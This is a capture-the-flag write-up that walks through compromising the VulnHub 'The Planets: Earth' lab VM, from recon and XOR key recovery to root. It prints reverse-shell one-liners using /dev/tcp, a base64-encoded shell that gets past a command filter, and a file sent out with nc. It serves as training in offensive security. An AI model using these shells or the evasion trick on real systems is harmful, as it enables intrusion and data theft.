---
title: Vulnhub, The Planets, Earth
date: Thu Aug 15 05:18:03 PM EDT 2024
categories: [PentestNotes]
tags: [linux,rce,reversing,vulnhub,subdomains]
---

## About Release

- **Name**: The Planets: Earth
- **Date release**: 2 Nov 2021
- **Author**: [SirFlash](https://www.vulnhub.com/author/sirflash,731/)
- **Series**: [The Planets](https://www.vulnhub.com/series/the-planets,362/)
## Download

- **Earth.ova** (Size: 2.0 GB)
- **Download (Mirror)**: [https://download.vulnhub.com/theplanets/Earth.ova](https://download.vulnhub.com/theplanets/Earth.ova)
## Description

**Difficulty**: Easy

[Earth](https://www.vulnhub.com/entry/the-planets-earth,755/) is an easy box though you will likely find it more challenging than "Mercury" in this series and on the harder side of easy, depending on your experience. There are two flags on the box: a user and root flag which include an md5 hash. This has been tested on VirtualBox so may not work correctly on VMware. Any questions/issues or feedback please email me at: SirFlash at protonmail.com, though it may take a while for me to get back to you.
## Recon

Get target IP on network:
```bash
└─$ ip -4 -brief address show eth0
eth0             UP             10.0.2.15/24
└─$ sudo netdiscover -i eth0 -r 10.0.2.0/24
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.3        08:00:27:64:6e:66      1      60  PCS Systemtechnik GmbH
 10.0.2.17       08:00:27:be:8c:91      1      60  PCS Systemtechnik GmbH # <--
```

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.17:443
Open 10.0.2.17:22
Open 10.0.2.17:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.0.2.17
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-21 06:44 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:44
Completed NSE at 06:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:44
Completed NSE at 06:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:44
Completed NSE at 06:44, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 06:44
Completed Parallel DNS resolution of 1 host. at 06:44, 0.05s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 06:44
Scanning 10.0.2.17 [3 ports]
Discovered open port 443/tcp on 10.0.2.17
Discovered open port 22/tcp on 10.0.2.17
Discovered open port 80/tcp on 10.0.2.17
Completed Connect Scan at 06:44, 0.00s elapsed (3 total ports)
Initiating Service scan at 06:44
Scanning 3 services on 10.0.2.17
Completed Service scan at 06:44, 12.28s elapsed (3 services on 1 host)
NSE: Script scanning 10.0.2.17.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:44
Completed NSE at 06:44, 3.08s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:44
Completed NSE at 06:44, 1.45s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:44
Completed NSE at 06:44, 0.00s elapsed
Nmap scan report for 10.0.2.17
Host is up, received user-set (0.00070s latency).
Scanned at 2024-07-21 06:44:33 UTC for 18s

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b2c3fdc8b76e9217bd05624dfbee9a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKPfhMLiVGrmuwlz9rx/UAEXrre+sPMkyOxfOLyH0ghmVuDOqg/PCx3Mu5Gw1K/mwFxPc662JKeGcwcaQ0j13qs=
|   256 b03c723b722126ce3a84e841ecc8f841 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOFcnJNVluex1Y3TV86t7w42tFj8JupDpcN9OhZ878U2
80/tcp  open  http     syn-ack Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_http-title: Bad Request (400)
443/tcp open  ssl/http syn-ack Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space/localityName=Milky Way
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Issuer: commonName=earth.local/stateOrProvinceName=Space/localityName=Milky Way
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-12T23:26:31
| Not valid after:  2031-10-10T23:26:31
| MD5:   4efa65d21a9e07184b5441da3712f187
| SHA-1: 04db5b29a33f8076f16b8a1b581d6988db257651
| -----BEGIN CERTIFICATE-----
| MIIFhjCCA26gAwIBAgIUZZZYScVhllOGdJWBnhMx5ztnlkcwDQYJKoZIhvcNAQEL
| BQAwOjEOMAwGA1UECAwFU3BhY2UxEjAQBgNVBAcMCU1pbGt5IFdheTEUMBIGA1UE
| AwwLZWFydGgubG9jYWwwHhcNMjExMDEyMjMyNjMxWhcNMzExMDEwMjMyNjMxWjA6
| MQ4wDAYDVQQIDAVTcGFjZTESMBAGA1UEBwwJTWlsa3kgV2F5MRQwEgYDVQQDDAtl
| YXJ0aC5sb2NhbDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAMqFZz4K
| O71xGgMvMuvefKWV4oZtq4qz6Y+Jq6nQ03zyZEsNSuGsKlBmZM54+hUGyNOOUScd
| PL4kUBX0uMujUxq1XKceeg5gJ/kMEAKbe8bqzyN/tPNJ4aCM00fryP/+zDR9fSFZ
| lGF3Xd+pmvLZz+D4CLVJDe5sEVoXIdtlg338gDVrCfkFUzl1uDTB4kPmLPu60LUP
| 4FNUWb2FY2HgQcHIIn6HuQ7GhHVnuNbfPn0PCX5ugGC9XxQq8XzwZs51bprdTU8x
| KaPkQKIJ60sGIS1xzgiLH5s2hkX5LW5u9V2mwqQ4CNS4FFMAbZl66NqPU08OuFau
| HLp/NDdixZPequLZGjIS/JjfYkNKHElzoMgLk5qvqFt9YpPX4ktfGteX8TsfF+pP
| ZdcudBC6BbODNTc+Wr+wLKe9OLZo1/EfJqHUH0h0Jwcrdfr/zOc77GzYhsdkSdiY
| GXZy48BkVV/kmWsMDK6W5Cs2rJx5DmC7ugt14KkzYv6Vv/o5uUtJjRypBjQ/htmR
| oo5mcKGaiohwCfR7T/lL1lA0Tq+cDYwATadudMQ8dgRmf099HO2iFXG4nqE+nacC
| ezfDR8qTXZDUaoTWUFAxI6Bp4M3BCae6x9S+LM6KF6ZoNZ4VroYDD/iub16Ci1FP
| biz6gaBX9iA/tBH6ubcW2V39EHgIswhwR0RtAgMBAAGjgYMwgYAwHQYDVR0OBBYE
| FCX2FKvs/3HZedJN9wbc5w/o884/MB8GA1UdIwQYMBaAFCX2FKvs/3HZedJN9wbc
| 5w/o884/MA8GA1UdEwEB/wQFMAMBAf8wLQYDVR0RBCYwJIILZWFydGgubG9jYWyC
| FXRlcnJhdGVzdC5lYXJ0aC5sb2NhbDANBgkqhkiG9w0BAQsFAAOCAgEAmOynGBnK
| GaLm68D50Xd0mKJlyjpHrI1I97btr7iNKa0UOfSBOutDPyN51j2ibyG/Eq9lVyS3
| DUEzG3PezGOP0EI8mmT92CqkPfc3+R6NL0q/+tszxgGPPmy66T8L/o+nHgUCrDbO
| Ypa8DPhha7HFIVhlJC49PJI9/M8r6UqrJEWW1lJSSd3uSxyfrbt5YkxBAsaJQ9w5
| RgnAYYr4v/a+icwzNov9YdW2mqGl0NuKh6henh+T+4ctAz3aLsUL2rJni17/Tp1q
| 6cxFkoNbbN6vTG7GjC0Mtqukbn9JIIfvWXQf7xWVIJIkvedhMDoikYE0tTeM8Vkz
| GngVRaziwCRdG4ur8ZztqHXMemhQ+TVqxOobTgc1NDIoMjhF1xwfbh2lSi/5px3/
| iN3D80mJ32x19p8/A+b9dk1kMWTfT46FBrl3UeF4VgzLVsVL2QQWNDZmzo0d4k7B
| Fn8Uzyzj7Tr1/R0oEL2Z75z2mZV9uClek7OLSarXFVQQOVgyXRbhG3+Q1AtVndur
| IdII4FThlEP3jnSAEin1dnKgsuGjz+8olmsyqu9p0xkv3iVvM1ErD/TnNUhAZGou
| ScfxACsYU2ZX8XKF/QyS35pgkR6/zJGashm/M9MMV8NN1AkhoQ0CwFzCcrQsGZjd
| S6cvQe6K0mUe4pdZwTYd2T0de4jpofXbWms=
|_-----END CERTIFICATE-----
|_http-title: Test Page for the HTTP Server on Fedora

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:44
Completed NSE at 06:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:44
Completed NSE at 06:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:44
Completed NSE at 06:44, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.80 seconds
```
</details>

{::options parse_block_html="false" /}

```bash
└─$ grep earth /etc/hosts
10.0.2.17 earth.local terratest.earth.local
```
## HTTPs (443)

HTTP was returning `Bad Request (400)` so I focused on HTTPs first.

The website has default installation of Fedora Webserver.

![Writeup.png](/assets/images/Vulnhub/The-Planets-Earth/Writeup.png)

Feroxbuster found nothing interesting, there's `/icons` and `/cgi-bin` directories on server.
```bash
└─$ feroxbuster -u https://10.0.2.17 -w /usr/share/seclists/Discovery/Web-Content/common.txt -k
200      GET        5l       20w      442c https://10.0.2.17/icons/sound2.png
[####################] - 2m      9766/9766    0s      found:209     errors:1897
[####################] - 66s     4728/4728    72/s    https://10.0.2.17/
[####################] - 82s     4728/4728    58/s    https://10.0.2.17/cgi-bin/ 
```

The HTTPs run on certificate and they usually have domain names:
```bash
└─$ cat nmap_scan_10.0.2.17 | grep DNS:
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
```

Update `/etc/hosts`:
```bash
└─$ grep earth /etc/hosts
10.0.2.17 earth.local terratest.earth.local
```

### terratest.earth.local

Visit new subdomain:

![Writeup-1.png](/assets/images/Vulnhub/The-Planets-Earth/Writeup-1.png)

Test the message functionality:

![Writeup-2.png](/assets/images/Vulnhub/The-Planets-Earth/Writeup-2.png)

Encryption uses a key, so first thing I thought was XOR. Test it:

![Writeup-3.png](/assets/images/Vulnhub/The-Planets-Earth/Writeup-3.png)

Ok, the messages use XOR, but to decode them we need keys..

There seems to be 2 server running on same domain or it's just vhost problem

HTTP:
```bash
└─$ feroxbuster -u http://terratest.earth.local -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -d 1
by Ben "epi" Risher 🤓                 ver: 2.10.3
──────────────────────────────────────────────────
404      GET       10l       21w      179c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        0l        0w        0c http://terratest.earth.local/admin => http://terratest.earth.local/admin/
403      GET        7l       20w      199c http://terratest.earth.local/cgi-bin/
200      GET    23131l   117709w 12023247c http://terratest.earth.local/static/earth1.jpg
200      GET        0l        0w      248c http://terratest.earth.local/static/styles.css
200      GET       35l       77w     2614c http://terratest.earth.local/
[####################] - 45s     4731/4731    0s      found:5       errors:0
[####################] - 45s     4728/4728    106/s   http://terratest.earth.local/ 
```

HTTPs:
```
└─$ feroxbuster -u https://terratest.earth.local -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -d 1
──────────────────────────────────────────────────
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        4w       26c https://terratest.earth.local/
200      GET        1l        4w       26c https://terratest.earth.local/index.html
200      GET       30l       60w      521c https://terratest.earth.local/robots.txt
[####################] - 9s      4728/4728    0s      found:3       errors:3
[####################] - 9s      4728/4728    554/s   https://terratest.earth.local/ 
```

#### Leaked Information

```bash
└─$ curl https://terratest.earth.local/robots.txt -k
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
└─$ curl https://terratest.earth.local/testingnotes.txt -k
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

Enumerate other extensions too, because it used wildcard.
```bash
└─$ ffuf -u 'https://terratest.earth.local/testingnotes.FUZZ' -w /usr/share/seclists/Fuzzing/file-extensions.txt -k
v2.1.0-dev
________________________________________________
txt                     [Status: 200, Size: 546, Words: 82, Lines: 10, Duration: 0ms]
:: Progress: [769/769] :: Job [1/1] :: 171 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

Get test data:
```bash
└─$ curl https://terratest.earth.local/testdata.txt -k
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

### XOR

Since XOR is symmetrical encryption we can use plaintext to get the key: [Recipe](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'According%20to%20radiometric%20dating%20estimation%20and%20other%20evidence,%20Earth%20formed%20over%204.5%20billion%20years%20ago.%20Within%20the%20first%20billion%20years%20of%20Earth%5C's%20history,%20life%20appeared%20in%20the%20oceans%20and%20began%20to%20affect%20Earth%5C's%20atmosphere%20and%20surface,%20leading%20to%20the%20proliferation%20of%20anaerobic%20and,%20later,%20aerobic%20organisms.%20Some%20geological%20evidence%20indicates%20that%20life%20may%20have%20arisen%20as%20early%20as%204.1%20billion%20years%20ago.'%7D,'Standard',false)&input=MjQwMjExMWIxYTA3MDUwNzBhNDEwMDBhNDMxYTAwMGEwZTBhMGYwNDEwNDYwMTE2NGQwNTBmMDcwYzBmMTU1NDBkMTAxODAwMDAwMDAwMGMwYzA2NDEwZjA5MDE0MjBlMTA1YzBkMDc0ZDA0MTgxYTAxMDQxYzE3MGQ0ZjRjMmMwYzEzMDAwZDQzMGUwZTFjMGEwMDA2NDEwYjQyMGQwNzRkNTU0MDQ2NDUwMzFiMTgwNDBhMDMwNzRkMTgxMTA0MTExYjQxMGYwMDBhNGM0MTMzNWQxYzFkMDQwZjRlMDcwZDA0NTIxMjAxMTExZjFkNGQwMzFkMDkwZjAxMGUwMDQ3MWMwNzAwMTY0NzQ4MWEwYjQxMmIxMjE3MTUxYTUzMWI0MzA0MDAxZTE1MWIxNzFhNDQ0MTAyMGUwMzA3NDEwNTQ0MTgxMDBjMTMwYjE3NDUwODFjNTQxYzBiMDk0OTAyMDIxMTA0MGQxYjQxMGYwOTAxNDIwMzAxNTMwOTFiNGQxNTAxNTMwNDA3MTQxMTBiMTc0YzJjMGMxMzAwMGQ0NDFiNDEwZjEzMDgwZDEyMTQ1YzBkMDcwODQxMGYxZDAxNDEwMTAxMWEwNTBkMGEwODRkNTQwOTA2MDkwNTA3MDkwMjQyMTUwYjE0MWMxZDA4NDExZTAxMGEwZDFiMTIwZDExMGQxZDA0MGUxYTQ1MGMwZTQxMGYwOTA0MDcxMzBiNTYwMTE2NGQwMDAwMTc0OTQxMWUxNTFjMDYxZTQ1NGQwMDExMTcwYzBhMDgwZDQ3MGExMDA2MDU1YTAxMDYwMDEyNDA1MzM2MGUxZjExNDgwNDA5MDYwMTBlMTMwYzAwMDkwZDRlMDIxMzBiMDUwMTVhMGIxMDRkMDgwMDE3MGMwMjEzMDAwZDEwNGMxZDA1MDAwMDQ1MGYwMTA3MGI0NzA4MDMxODQ0NWMwOTAzMDg0MTBmMDEwYzEyMTcxYTQ4MDIxZjQ5MDgwMDA2MDkxYTQ4MDAxZDQ3NTE0YzUwNDQ1NjAxMTkwMTA4MDExZDQ1MTgxNzE1MWExMDRjMDgwYTBlNWE&ieol=CRLF&oeol=FF)

![Writeup-4.png](/assets/images/Vulnhub/The-Planets-Earth/Writeup-4.png)

String `earthclimatechangebad4humans` keeps repeating, meaning it's the XOR key.

> Key: `earthclimatechangebad4humans`
{: .prompt-tip }

The key only worked for first message.

### Admin Panel

Let's try the login panel now at [http://terratest.earth.local/admin/](http://terratest.earth.local/admin/) (**HTTP**)

Try credentials with user `terra` and key

![Writeup-5.png](/assets/images/Vulnhub/The-Planets-Earth/Writeup-5.png)

> Creds: `terra:earthclimatechangebad4humans`
{: .prompt-tip }

We can execute commands, so let's get a reverse shell. Get a payload from [revshells](https://www.revshells.com), like:
```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'
```

The command was unsuccessful, error: `Remote connections are forbidden.`

`/var/www/html` didn't have anything interesting, but going up to `/var` there are few noticeable directories.

![Writeup-6.png](/assets/images/Vulnhub/The-Planets-Earth/Writeup-6.png)

![Writeup-7.png](/assets/images/Vulnhub/The-Planets-Earth/Writeup-7.png)

#### User.txt

![Writeup-8.png](/assets/images/Vulnhub/The-Planets-Earth/Writeup-8.png)

> Flag: `user_flag_3353b67d6437f07ba7d34afd7d2fc27d`
{: .prompt-tip }

![Writeup-9.png](/assets/images/Vulnhub/The-Planets-Earth/Writeup-9.png)

## Reverse Shell

The error which mentions that remote connections are disabled may just be a filter, it's thrown whenever commands like `nc`, `curl`, `wget` are ran.

When can try encrypting the command and test if we get shell:
```bash
└─$ echo 'sh -i >& /dev/tcp/10.0.2.15/4444 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4yLjE1LzQ0NDQgMD4mMQo=
```

Run the command:
```
echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4yLjE1LzQ0NDQgMD4mMQo=|base64 -d|sh
```

Catch the shell:
```bash
└─$ declare -f listen
listen () {
        local port="${1:-4444}"
        rlwrap ncat -lvnp $port
}
└─$ listen
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.17:52402.
sh: cannot set terminal process group (836): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1$ whoami
apache
sh-5.1$ python3 -c 'import pty;pty.spawn("/bin/bash")' # Get pty shell
bash-5.1$ sudo -l
[sudo] password for apache:

Sorry, try again.
[sudo] password for apache:

Sorry, try again.
[sudo] password for apache:

sudo: 3 incorrect password attempts
bash-5.1$ find / -perm -4000 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/reset_root
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
```

`sudo -l` fails because we need password for account. Then we list available `suid` binaries to escalate privileges.

`/usr/bin/reset_root` program seems out of the ordinary.
```bash
bash-5.1$ /usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.

bash-5.1$ file /usr/bin/reset_root
/usr/bin/reset_root: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4851fddf6958d92a893f3d8042d04270d8d31c23, for GNU/Linux 3.2.0, not stripped
```

It's an ELF binary, meaning some Reverse Engineering will be required. `strings` isn't that helpful, `strace` or `ltrace` doesn't exist on remote server, so we should dissect the file locally.

```bash
└─$ listen > reset_root.base64
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.17:52404.
---
bash-5.1$ base64 /usr/bin/reset_root -w0 | nc 10.0.2.15 4444
---
└─$ cat reset_root.base64 | base64 -d > reset_root.elf
└─$ chmod u+x reset_root.elf
└─$ ltrace ./reset_root.elf
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                     = 38
access("/dev/shm/kHgTFI5G", 0)                                  = -1
access("/dev/shm/Zw7bV9U5", 0)                                  = -1
access("/tmp/kcM0Wewe", 0)                                      = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                     = 44
+++ exited (status 0) +++
```

Looks like "trigger" conditions to be met 3 files need to be present on system.

```bash
access("/dev/shm/kHgTFI5G", 0)
access(filename,            mode)

mode = 0 = F_OK ==> File Exists
```

## Privilege Escalation (root)

```bash
bash-5.1$ touch /tmp/kcM0Wewe /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5
bash-5.1$ /usr/bin/reset_root
/usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
bash-5.1$ su -
su -
Password: Earth

[root@earth ~]# whoami
root
```

### Root.txt

```
[root@earth ~]# ls /root
anaconda-ks.cfg  root_flag.txt
[root@earth ~]# cat /root/root_flag.txt
cat /root/root_flag.txt

              _-o#&&*''''?d:>b\_
          _o/"`''  '',, dMF9MMMMMHo_
       .o&#'        `"MbHMMMMMMMMMMMHo.
     .o"" '         vodM*$&&HMMMMMMMMMM?.
    ,'              $M&ood,~'`(&##MMMMMMH\
   /               ,MMMMMMM#b?#bobMMMMHMMML
  &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
 ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
MMMMMb_                   |MMMMMMMMMMMP'     :
HMMMMMMMHo                 `MMMMMMMMMT       .
?MMMMMMMMP                  9MMMMMMMM}       -
-?MMMMMMM                  |MMMMMMMMM?,d-    '
 :|MMMMMM-                 `MMMMMMMT .M|.   :
  .9MMM[                    &MMMMM*' `'    .
   :9MMk                    `MMM#"        -
     &M}                     `          .-
      `&.                             .
        `~,   .                     ./
            . _                  .-
              '`--._,dd###pp=""'

Congratulations on completing Earth!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
```
